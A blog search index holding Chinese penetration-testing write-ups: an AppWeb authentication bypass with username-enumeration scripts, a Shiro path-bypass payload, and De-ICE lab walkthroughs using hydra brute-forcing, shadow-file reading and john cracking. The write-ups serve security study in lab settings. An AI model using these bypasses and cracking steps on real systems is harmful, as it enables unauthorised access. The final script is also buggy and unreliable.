@@ -1,0 +1,665 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>AppWeb认证绕过（CVE-2018-8715）</title>
+    <url>/2022/02/22/AppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%EF%BC%88CVE-2018-8715%EF%BC%89/</url>
+    <content><![CDATA[<h3 id="AppWeb介绍">AppWeb介绍</h3>
+<p>Appweb是一个嵌入式HTTP Web服务器，主要的设计思路是安全。使用C/C++来编写。AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。</p>
+<ol>
+<li>basic 传统HTTP基础认证</li>
+<li>digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不再传递Authorization头</li>
+<li>form 表单认证</li>
+</ol>
+<h3 id="漏洞介绍">漏洞介绍</h3>
+<p>在7.0.3之前版本中，对于digest和form两种认证方式，如果用户传入的密码为’null‘（也就是没有传递密码参数），appweb会直接认证通过成功，并返回session。</p>
+<p>但是执行该漏洞需要一个前提：<em>一个存在的用户账号</em></p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<p>利用docker建立靶机环境。</p>
+<p><code>docker-compose up -d</code></p>
+<p><img src="/images/image-20220215102510383.png" alt="image-20220215102510383"></p>
+<p>容器已经开启，访问’<a href="http://192.168.1.134:8080">http://192.168.1.134:8080</a>‘，访问同时使用burp进行抓包。</p>
+<p><img src="/images/image-20220215102911190.png" alt="image-20220215102911190"></p>
+<p>抓到第一个包，看起来没有什么特别的，也没有什么可以AppWeb的标志。</p>
+<p><img src="/images/image-20220215103404716.png" alt="image-20220215103404716"></p>
+<p>这里直接使用<code>admin</code>已知用户就可以登录了。</p>
+<p><img src="/images/image-20220215103938454.png" alt="image-20220215103938454"></p>
+<p>这里的密码随便输入响应码为401.需要将后面的参数删除即可。返回状态码200.</p>
+<p><img src="/images/image-20220215104213527.png" alt="image-20220215104213527"></p>
+<p>返回了Set-Cookie，现在需要将get包转变为post包，加入获得的cookie就可以获得访问权限。</p>
+<p><img src="/images/image-20220215110114991.png" alt="image-20220215110114991"></p>
+<p>这里可以正常访问，尝试删掉cookie，在用post进行登录。</p>
+<p><img src="/images/image-20220215110540108.png" alt="image-20220215110540108"></p>
+<p>还是正常访问，cookie相比较更实用于浏览器。使用session修改插件进行访问尝试。</p>
+<p>浏览器修改session插件，<code>cookie editor</code>，</p>
+<p><img src="/images/image-20220215112525377.png" alt="image-20220215112525377"></p>
+<p>重新抓包查看请求，cookie里面已经含有数据了，删除参数绕过登录验证。成功已获得权限。</p>
+<p><img src="/images/image-20220215113142184.png" alt="image-20220215113142184"></p>
+<p>发现参数已经改变了，看来需要绕过登录后在使用，进入靶机后都是网页没法验证权限维持多久。</p>
+<h3 id="脚本编写">脚本编写</h3>
+<p>先让脚本可以正常访问网站返回session，然后进行状态码的判断和地址的输入，最后进行脚本判断将字典一行一行导入，成功就输出cookie，错误就拜拜。</p>
+<p>第一步：使用requests，挑模块的时候挑花了眼最后使用熟悉点的requests库。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  <span class="comment">#导入库</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://192.168.1.134:8080&#x27;</span>   <span class="comment">#目标地址</span></span><br><span class="line">headers = &#123;              <span class="comment">#构建get请求包直接将上面发送包的内容全部搬下来</span></span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;192.168.1.134:8080&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cache-Control&#x27;</span>:<span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Authorization&#x27;</span>:<span class="string">&#x27;Digest username=&quot;admin&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;user-agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0(Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip,deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>:<span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>:<span class="string">&#x27;close&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">test = requests.get(url=url,headers=headers)    <span class="comment">#请求目标地址带上了headers参数</span></span><br><span class="line">text = <span class="built_in">dict</span>(test.cookies)     <span class="comment">#将返回的响应cookies参数以字典形式存贮在text中</span></span><br><span class="line"><span class="built_in">print</span>(text)	                <span class="comment">#输出cookies参数</span></span><br></pre></td></tr></table></figure>
+<p>第二步：对网站的响应码进行判断，从上面burp中能看出来网站对账户的判断就两种401，200.</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">input</span>(<span class="string">&#x27;http://&#x27;</span>)   <span class="comment">#自助输入目标地址</span></span><br><span class="line">url =<span class="string">&#x27;http://%s&#x27;</span> %s    <span class="comment">#将目标地址传入url，requests的url必须带http开头不然报错</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;192.168.1.134:8080&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cache-Control&#x27;</span>:<span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Authorization&#x27;</span>:<span class="string">&#x27;Digest username=&quot;admin&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;user-agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0(Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip,deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>:<span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>:<span class="string">&#x27;close&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">test = requests.get(url=url,headers=headers)</span><br><span class="line"><span class="keyword">if</span> test.status_code == <span class="number">200</span>:     <span class="comment">#对状态码的判断</span></span><br><span class="line">    text = <span class="built_in">dict</span>(test.cookies)   <span class="comment">#200就输入cooker</span></span><br><span class="line">    <span class="built_in">print</span>(text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>第三步：将脚本进行导入，对状态码判断，进行循环，成功则推出</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">input</span>(<span class="string">&#x27;http://&#x27;</span>)</span><br><span class="line">filee = <span class="built_in">input</span>(<span class="string">&#x27;字典地址：&#x27;</span>)  <span class="comment">#输入字典地址注意win和linux地址字符不同</span></span><br><span class="line">url =<span class="string">&#x27;http://%s&#x27;</span> %s</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;192.168.1.134:8080&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cache-Control&#x27;</span>:<span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Authorization&#x27;</span>:<span class="string">&#x27;Digest username=&quot;admin&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;user-agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0(Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip,deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>:<span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>:<span class="string">&#x27;close&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file = <span class="built_in">open</span>(filee,<span class="string">&#x27;r&#x27;</span>)    <span class="comment">#以只读模式打开目标文件</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:                  <span class="comment">#直接进入循环</span></span><br><span class="line">    re = file.readline().strip()          <span class="comment">#readlin按行读取文件，strip去除‘/n’</span></span><br><span class="line">    digest = <span class="string">&#x27;Digest username=&quot;%s&quot;&#x27;</span> %re    </span><br><span class="line">    headers[<span class="string">&#x27;Authorization&#x27;</span>] = digest</span><br><span class="line">    test = requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="keyword">if</span> test.status_code == <span class="number">200</span>:</span><br><span class="line">        text = <span class="built_in">dict</span>(test.cookies)</span><br><span class="line">        <span class="built_in">print</span>(re)</span><br><span class="line">        <span class="built_in">print</span>(text)</span><br><span class="line">        <span class="keyword">continue</span>       <span class="comment">#判断成功就返回，继续循环，万一又有一个呢</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re:         </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">file.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>最后加一个目录字典吧，能自动绝对不手动</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">input</span>(<span class="string">&#x27;目录地址:&#x27;</span>)     <span class="comment">#目录地址和字典地址一样都要注意系统符号</span></span><br><span class="line">filee = <span class="built_in">input</span>(<span class="string">&#x27;字典地址:&#x27;</span>)</span><br><span class="line">files = <span class="built_in">open</span>(s, <span class="string">&#x27;r&#x27;</span>)      <span class="comment">#打开目录地址</span></span><br><span class="line">file = <span class="built_in">open</span>(filee, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;192.168.1.134:8080&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cache-Control&#x27;</span>:<span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Authorization&#x27;</span>:<span class="string">&#x27;Digest username=&quot;admin&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;user-agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0(Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip,deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>:<span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>:<span class="string">&#x27;close&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    url = files.readline().strip()    <span class="comment">#按行读取目录地址</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        re = file.readline().strip()</span><br><span class="line">        digest = <span class="string">&#x27;Digest username=&quot;%s&quot;&#x27;</span> %re</span><br><span class="line">        headers[<span class="string">&#x27;Authorization&#x27;</span>] = digest</span><br><span class="line">        test = requests.get(url=url,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> test.status_code == <span class="number">200</span>:</span><br><span class="line">            text = <span class="built_in">dict</span>(test.cookies)</span><br><span class="line">            <span class="built_in">print</span>(re)               <span class="comment">#输出正确的用户名</span></span><br><span class="line">            <span class="built_in">print</span>(text)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re:</span><br><span class="line">            <span class="built_in">print</span>(url&amp;<span class="string">&#x27;完&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> url == <span class="string">&#x27;http://&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;https://&#x27;</span>:   <span class="comment">#判断目录是不是空目录，空目录直接停止</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">file.close()</span><br><span class="line">files.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="总结">总结</h3>
+<p>当在现实环境中，AppWeb的特征应该时cooler的中带有-http-session。获得session就可以在登陆后遨游了。这个脚本也就适合去找漏洞，要是利用方面还是要靠burp去绕过之后看后台，或许别的方法也可以直接图像化显示只是现在我比较菜鸡。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>END 文章已结束</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2020-1957</title>
+    <url>/2022/02/22/CVE-2020-1957/</url>
+    <content><![CDATA[<h3 id="漏洞信息">漏洞信息</h3>
+<p>Shiro 权限绕过漏洞：shiro框架通过拦截器功能来对用户访问权限进行控制，如anon，authc’等拦截器。Spring web在匹配url的时候校验未完全，造成绕过，访问未授权路径</p>
+<h3 id="shiro">shiro</h3>
+<p>Apache Shiro是一个java安全框架。可以进行身份验证、授权、密码和会话管理。</p>
+<p>三个核心组件：Subject、SecurityManager、Realms</p>
+<h3 id="漏洞分析">漏洞分析</h3>
+<p>内容来自spoock，网址https://blog.spoock.com/2020/05/09/cve-2020-1957/</p>
+<p>在URL在项目中传递，首先传入URL1，经过shiro权限检验URL2，最后到springboot项目找到路由来处理URL3</p>
+<p>漏洞的出现就在URL1,URL2和URL3 有可能不是同一个URL，这就导致我们能绕过shiro的校验，直接访问后端需要首选的URL。本例中的漏洞就是因为这个原因产生的。</p>
+<p><img src="/images/image-20220214201956216.png" alt="image-20220214201956216"></p>
+<p>这里URL还是传入的原始URL：/xxxx/…;/admin/index</p>
+<p>接着程序会用decodeAndCleanUriString(), 进行处理：</p>
+<p><img src="/images/image-20220214202437319.png" alt="image-20220214202437319">	decodeAndCleanUriString 以 <code>;</code>截断后面的请求,所以此时返回的就是 <code>/xxxx/..</code>.然后程序调用normalize() 对decodeAndCleanUriString()处理得到的路径进行标准化处理. 标准话的处理包括:</p>
+<ul>
+<li>替换反斜线</li>
+<li>替换 <code>//</code> 为 <code>/</code></li>
+<li>替换 <code>/./</code> 为 <code>/</code></li>
+<li>替换 <code>/../</code> 为 <code>/</code></li>
+</ul>
+<p>经过经过getPathWithinApplication()函数的处理,最终shiro 需要校验的URL 就是 <code>/xxxx/..</code>. 最终会进入到 org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver 中的 getChain()方法会URL校验. 关键的校验方法如下</p>
+<p><img src="/images/image-20220214202712733.png" alt="image-20220214202712733"></p>
+<p>最终我们的原始请求 <code>/xxxx/..;/admin/index</code> 就会进入到 springboot中. springboot对于每一个进入的request请求也会有自己的处理方式,找到自己所对应的mapping. 具体的匹配方式是在:<code>org.springframework.web.util.UrlPathHelper 中的 getPathWithinServletMapping()</code></p>
+<p>getPathWithinServletMapping() 在一般情况下返回的就是 servletPath, 所以本例中返回的就是 /admin/index.最终到了/admin/index 对应的requestMapping, 如此就成功地访问了后台请求.</p>
+<p>由于 <code>/xxxx/..</code> 并不会匹配到 <code>/admin/**</code>, 所以shiro权限校验就会通过</p>
+<ol>
+<li>客户端请求URL：/xxxx/…;/admin/index</li>
+<li>shrio内部处理得到校验URL为/xxxx/…，校验通过</li>
+<li>springboot处理/xxxx/…;/admin/index，最终请求/admin/index，成功访问了后台请求</li>
+</ol>
+<h3 id="漏洞复现">漏洞复现</h3>
+<p>使用vulhub进行搭建，下载地址：<a href="https://github.com/vulhub/vulhub%EF%BC%8C%E8%BF%9B%E5%85%A5%E7%9A%84CVE-2020-1957%E7%9B%AE%E5%BD%95%E4%B8%AD%EF%BC%8C%E7%9B%B4%E6%8E%A5%E5%90%AF%E5%8A%A8docker%E5%AE%B9%E5%99%A8%E3%80%82">https://github.com/vulhub/vulhub，进入的CVE-2020-1957目录中，直接启动docker容器。</a></p>
+<p><code>dockers-compose up -d</code></p>
+<p><img src="/images/image-20220214184217820.png" alt="image-20220214184217820"></p>
+<p>当显示done的时候，表示容器已经启动。可以在浏览器中访问了。</p>
+<p><code>http://192.168.1.134:8080</code></p>
+<p><img src="/images/image-20220214184831301.png" alt="image-20220214184831301"></p>
+<p>使用burp进行抓包，在点击到<em>Accout info</em>时返回了一个响应码302的包，路径为/admin。</p>
+<p><img src="/images/image-20220214194811375.png" alt="image-20220214194811375"></p>
+<p><em>（响应码302：redirect，代表暂时性转移。将服务端的拦截器或者其他代码处理会被重定向到网址b。）</em></p>
+<p>这里应该就是漏洞的所在了。尝试使用命令*/xxx/…;/admin/*，成功返回响应码200，绕过登录界面，成功进入后台。</p>
+<p><img src="/images/image-20220214200722995.png" alt="image-20220214200722995"></p>
+<p><img src="/images/image-20220214195549042.png" alt="image-20220214195549042"></p>
+<p>在登陆界面是没有返回302的响应包的，只有一个平常的login，直接尝试修改。<em>/xxx/…;/admin/</em></p>
+<p><img src="/images/image-20220214195915623.png" alt="image-20220214195915623"></p>
+<p>同样成功进入后台。<img src="/images/image-20220214200904191.png" alt="image-20220214200904191"></p>
+<h3 id="总结-2">总结</h3>
+<p>该漏洞以特殊形式绕过了两次检测，携带恶意代码最终执行。当进行绕过时应该注重程序的检测方法，针对不同的方法进行绕过。</p>
+<p>该漏洞重点是截断了检测，未对后半段url进行检测，中间没看出来为什么*；<em>没啦。应该是使用程序中使用了</em>decodeAndCleanUriString*类的函数对URL进行格式化处理。然后getPathWithinApplication匹配出了地址，<code>/admin/index</code> 传入servletPath。绕过成功。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>END 文章已结束</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>De-ICE_S1.100</title>
+    <url>/2022/02/22/DE-ICE%20S1.100/</url>
+    <content><![CDATA[<h3 id="信息介绍">信息介绍</h3>
+<p>下载地址：<a href="https://noref.io/#https://hackingdojo.com/downloads/iso/De-ICE_S1.100.iso">https://noref.io/#https://hackingdojo.com/downloads/iso/De-ICE_S1.100.iso</a></p>
+<p>靶机已配置地址IP：192.168.1.100</p>
+<p>攻击机IP：192.168.1.104</p>
+<p>运行环境：VMware</p>
+<h3 id="信息收集">信息收集</h3>
+<p>确定靶机和攻击机之间可以通信，等待时间较长一度认为没法通信。<br>
+<code>ping 192.168.1.100</code><br>
+<a href="/images/image-20220206022714726.png">image-20220206022714726</a></p>
+<p>确定可以使用后进行端口扫描，开放端口有<em>20（ftp数据传输端口），21（ftp连接端口），22（ssh连接端口），25（简单邮件传输端口），80（网页服务端口），110（POP3邮件协议端口），143（邮件接受协议端口），443（网页加密安全传输端口）</em><br>
+<code>nmap -sV 192.168.1.100</code><br>
+<img src="/images/image-20220206022841403.png" alt="image-20220206022841403"></p>
+<p>还是先看看网页上有什么重要东西。连接不是很通畅略有点卡顿，刷新了几次还是进来了。<img src="/images/image-20220206023757137.png" alt="image-20220206023757137"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">欢迎来到De ICE。net的PenTest实验室</span><br><span class="line">PenTest实验室磁盘#1.100版本1.0</span><br><span class="line">有关最新版本，请访问http://www.De-ICE.net</span><br><span class="line">有关本LiveCD的难度和扰流板信息，请访问此页面。</span><br><span class="line">有关本LiveCD使用和发行的法律信息，请访问本页面。</span><br><span class="line">为了你的安全</span><br><span class="line">如果您从与除冰无关的位置或人员处收到此磁盘。net（包括torrents或P2P网络），我强烈建议您从De ICE下载最新版本。net而不是使用这个磁盘（这是一个免费下载，所以你最好安全地下载原始版本）。</span><br><span class="line">重要的</span><br><span class="line">这个磁盘和任何除冰设备。net PenTest实验室磁盘，仅用于隔离网络。使用此磁盘和与这些练习相关的PenTest软件存在潜在危险，如果不保证实验室的适当隔离，可能会导致网络崩溃、拒绝服务攻击，甚至对您和/或其他网络造成更严重的危害——滥用这些磁盘可能会导致违反访问法。此磁盘的作者和贡献者不对使用这些磁盘期间可能发生的任何损坏负责。有关使用此磁盘的安全和责任的信息，请访问上面提到的许可证信息。要负责，要安全。</span><br><span class="line">要查看与游戏相关的网页，</span><br><span class="line">点击这里</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20220206025851896.png" alt="image-20220206025851896"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">欢迎来到“无安全公司”</span><br><span class="line">信息公司门户！！</span><br><span class="line">前几天我们进行了一次很棒的野餐——感谢所有帮助我们的人。不幸的是，我们在接近尾声时遭到了野生土拨鼠的袭击，我们希望玛丽·M·能尽快康复——鲜花和卡片可以寄到“不幸死亡的夫人，医院和反铲租赁”的北附楼。我们将很快发布野餐的照片，稍后再查看。</span><br><span class="line">注意:</span><br><span class="line">重要的下周我们将发布最新的反土拨鼠电击枪，但我们需要志愿者事先测试这些设备。如果有人感兴趣的话，我们将在下周在化学品库后面进行测试。一定要带口罩，因为我们已经大大提高了这个升级产品的电压——我们真的不想再像上次测试枪那样断牙或舌头流血了。记住，安全第一！</span><br><span class="line">说到化学品库，人们能记得在使用后更换桶盖吗？我们又发生了一起事故，有人在冒烟休息时摔倒了。幸运的是，这次事故造成的泄漏渗入了地面，所以我们不必再担心火灾。但为了确定，我们将把指定的吸烟区从化学品棚移到木材场的锯木厂。我们知道这是一条更远的路，但感谢您对这个问题的关注。</span><br><span class="line">-查理O（首席执行官）</span><br><span class="line">以下是各组织机构的联系信息列表：</span><br><span class="line">财务：如有财务问题，请联系人力资源部：</span><br><span class="line">人力资源总监：Marie Mary - marym@herot.net（紧急休假）</span><br><span class="line">员工薪酬：Pat Patrick - patrickp@herot.net</span><br><span class="line">旅游公司：Terry Thompson - thompsont@herot.net</span><br><span class="line">福利：Ben Benedict - benedictb@herot.net</span><br><span class="line">工程部：对于工程部，我们有以下信息：</span><br><span class="line">工程总监：Erin Gennieg - genniege@herot.net</span><br><span class="line">项目经理：Paul Michael - michaelp@herot.net</span><br><span class="line">工程师负责人：Ester Long-longe@herot.net</span><br><span class="line">如果此服务器有任何问题，或需要更改信息，请联系以下人员：</span><br><span class="line">高级系统管理员：Adam Adams - adamsa@herot.net</span><br><span class="line">系统管理员（实习生）：Bob Banter - banterb@herot.net</span><br><span class="line">系统管理员：Chad Coffee - coffeec@herot.net</span><br></pre></td></tr></table></figure>
+<p>在网页中发现了许多邮箱地址，可以用来尝试等陆爆破。扫描一下目录看看还有什么东西。<br>
+<code>dirb http://192.168.1.100</code></p>
+<p><img src="/images/image-20220206030522271.png" alt="image-20220206030522271"></p>
+<p>查看了一下网页能用的只有http://192.168.1.100/info.php</p>
+<p><img src="/images/image-20220206030741250.png" alt="image-20220206030741250">在首页中发现了，提示性文字，部分字体设置为白色，根据提示步骤，应该是靠爆破出账号密码的。而且指名说实习生的安全意识差，所以就对 Bob Banter - banterb@herot.net进行字典生成。</p>
+<p><img src="/images/image-20220206033300910.png" alt="image-20220206033300910"> 使用hydra进行爆破</p>
+<p><code>hydra -L 233.txt -P 233.txt ssh://192.168.1.100</code></p>
+<p><img src="/images/image-20220207202203702.png" alt="image-20220207202203702"></p>
+<p>尝试登录bbanter有报错信息</p>
+<p><code>Unable to negotiate with 192.168.1.100 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1</code><br>
+因为新版Openssh中认为SHA1这种hash散列算法过于薄弱，停止支持这种加密方式了，需要手动配置。<br>
+<code>sudo vim /root/.ssh/config</code></p>
+<p><code>host 192.168.1.100 port 22 KexAlgorithms +diffie-hellman-group1-sha1 KexAlgorithms +diffie-hellman-group14-sha1</code></p>
+<p><img src="/images/image-20220207203529382.png" alt="image-20220207203529382"> 登录成功。</p>
+<p><code>uname -a </code>查看linux版本信息</p>
+<p><code>sudo -l </code>查看命令权限</p>
+<p><code>cat /etc/passwd</code> 查看存在用户<img src="/images/image-20220207204917496.png" alt="image-20220207204917496"></p>
+<p><code>cat /etc/group</code> 查看用户组的信息</p>
+<p>/images/image-20220207231416310.png</p>
+<p>aadams所属组的权限较高，尝试爆破aadams用户。爆破密码为nostradamus</p>
+<p><img src="/images/image-20220208005942156.png" alt="image-20220208005942156"></p>
+<p>登录aadams,查看用户权限。</p>
+<p><img src="/images/image-20220208010303681.png" alt="image-20220208010303681"></p>
+<h3 id="提权">提权</h3>
+<p><code>sudo cat /etc/passwc</code> 将获得密码整行copy下来保存在221.txt中</p>
+<p><img src="/images/image-20220208010804376.png" alt="image-20220208010804376"></p>
+<p>获得密码，使用john进行爆破。</p>
+<p><code>john --wordlist=rock.txt --rules=221.txt</code><img src="/images/image-20220208011916823.png" alt="image-20220208011916823"></p>
+<p>获得root密码。su root 进入root权限。<img src="/images/image-20220208012638118.png" alt="image-20220208012638118"></p>
+<h3 id="总结-3">总结</h3>
+<p>全靠字典强大，弱口令规则很重要。</p>
+]]></content>
+      <categories>
+        <category>靶机</category>
+      </categories>
+      <tags>
+        <tag>END 文章已结束</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>De-ICE_S1.110</title>
+    <url>/2022/02/22/De-ICE%20S1.110/</url>
+    <content><![CDATA[<h3 id="信息介绍-2">信息介绍</h3>
+<p>下载地址：<a href="https://noref.io/#http://hackingdojo.com/downloads/iso/De-ICE_S1.110.iso">https://noref.io/#http://hackingdojo.com/downloads/iso/De-ICE_S1.110.iso</a></p>
+<p>靶机IP：192.168.1.110</p>
+<p>攻击IP：192.168.1.128</p>
+<p>运行环境：VMware</p>
+<h3 id="信息收集-2">信息收集</h3>
+<p><code>nmap -sS 192.168.1.1/24</code><img src="/images/image-20220209220744314.png" alt="image-20220209220744314"></p>
+<p>确定目标IP地址为192.168.1.110，确定端口详细信息。</p>
+<p><code>nmap -A 192.168.1.110</code><img src="/images/image-20220209221056236.png" alt="image-20220209221056236"></p>
+<p>发现fcp可以匿名登录，目录下存在两个文件夹。/download和/incoming，在/download/etc中发现了shadow文件。<img src="/images/image-20220209221446530.png" alt="image-20220209221446530"></p>
+<h3 id="爆破密码">爆破密码</h3>
+<p>打开之后存在一个root账户和密码。使用john进行爆破。<img src="/images/image-20220209221741844.png" alt="image-20220209221741844"></p>
+<p><code>john --wordlist=rockyou-withcount.txt --rules 221.txt</code><img src="/images/image-20220209222043452.png" alt="image-20220209222043452"></p>
+<p>密码为toor，尝试ssh连接。<img src="/images/image-20220209222123958.png" alt="image-20220209222123958"></p>
+<p>一直被拒，拒绝的怀疑键盘输入有问题。只能重新在ftp内找有用文件。</p>
+<h5 id="1000-YEARS-LATER">1000 YEARS LATER</h5>
+<p>查看别人的攻略方法，发现在/download/etc中有个core文件。因为core文件是核心文件直接打开会显示乱码，所有一直没有关注过这个文件。</p>
+<p><code>核心文件是核心转储文件，通常在操作系统或者操作系统上运行的应用程序由于某种原因崩溃时创建的</code></p>
+<p><em>file core：ELF 32-bit LSB core file,Intel 80386,version 1(SYSV)</em></p>
+<p><em>括号内的内容指出是谁创建的转储文件。 核心文件是一个二进制文件，可以调试到文件中并读取它的内容。但要以文本格式查看，命令：strings core</em></p>
+<p><img src="/images/image-20220209230051208.png" alt="image-20220209230051208"></p>
+<p><img src="/images/image-20220209230212109.png" alt="image-20220209230212109"></p>
+<p>在core文件中出现包括root在内的四个用户。准备使用john爆破。</p>
+<p><code>john --wordlist=xx.txt --rules /221.txt</code><img src="/images/image-20220210000206403.png" alt="image-20220210000206403"></p>
+<p>爆破出root ：Complexity 、bbanter ：Zymurgy尝试登录，root用户没法登录只能去登录bbanter。<img src="/images/image-20220210000720810.png" alt="image-20220210000720810"></p>
+<p>用命令su root尝试登录root用户，成功。<img src="/images/image-20220210000910326.png" alt="image-20220210000910326"></p>
+<h3 id="寻找文件">寻找文件</h3>
+<p>靶机提示中描述需要找到加密敏感文件，并进行解密。搜索带有加密拓展名的文件（.enc）</p>
+<p><code>find / -name &quot;*.enc&quot; -mount</code><img src="/images/image-20220210001808397.png" alt="image-20220210001808397"></p>
+<p>打开相应目录，在里面还有一个copy.sh文件。查看一下是文件的加密方法。<img src="/images/image-20220210002440727.png" alt="image-20220210002440727"></p>
+<h3 id="加密解密过程">加密解密过程</h3>
+<p><code>#!/bin/sh 	#encrypt files in ftp/incoming(在ftp传入文件中加密文件) 	openssl enc -aes-256-cbc -salt -in /home/ftp/incoming/$1 -out 				/home/root/.save/$1.enc -pass file:/etc/ssl/certs/pw</code><br>
+<code>（使用openssl工具，用aes-256-cbc法加密，加密时加入杂质。加密的文件在/home/ftp/incoming/$1，加密完成后保存在/home/root/.save/$1.enc，密码存放在/etc/ssl/certs/pw）</code><br>
+<code>#remove old file（删除旧文件）</code><br>
+<code>rm /home/ftp/incoming/$1</code></p>
+<h5 id="解密文件方法为">解密文件方法为</h5>
